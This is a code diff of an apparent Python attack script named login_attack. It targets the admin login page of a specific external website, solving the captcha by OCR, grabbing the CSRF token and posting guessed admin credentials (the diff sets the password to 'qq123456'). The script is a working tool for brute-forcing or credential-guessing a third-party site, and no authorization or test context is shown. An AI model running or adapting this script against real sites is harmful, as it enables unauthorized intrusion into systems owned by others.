@@ -8,6 +8,7 @@ base_captcha = "captcha"
 base_url = "http://www.ximimim.top:1008"
 route_login = "/admin/common/login.shtml"
 route_captcha = "/captcha.shtml"
+session_request = requests.Session()
 
 
 def img_ocr(img):
@@ -84,16 +85,18 @@ def login_attack(username, password, code, token):
     # 请求参数
     # data = {'name': username, 'password': password, 'captcha': code, '__token__': token}
     data = "name={0}&password={1}&captcha={2}&__token__={3}".format(username, password, code, token)
+    print(data)
     header = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299',
         'X-Requested-With': 'XMLHttpRequest',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'Cookie': 'PHPSESSID=' + secrets.token_hex(13),
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
+        # 'Cookie': 'PHPSESSID=gq0npeainecd9vn5si0vqb08g0'
     }
+    #  + secrets.token_hex(13),
     # data = urllib3.urlencode(postData)
     # res = requests.post(url=base_url + route_login, data=data, headers=header, verify=False)
     res = requests.post(url=base_url + route_login, data=data, headers=header)
     result = json.loads(res.text)
+    print("xxx11", result)
     return result
 
 
@@ -108,7 +111,7 @@ if __name__ == '__main__':
     token = login_token()
     captcha_code = get_captcha_code()
     username = "admin"
-    password = "xxxx"
+    password = "qq123456"
     login_info = login_attack(username, password, captcha_code, token)
     print(login_info)
     if login_info['code'] == 1:
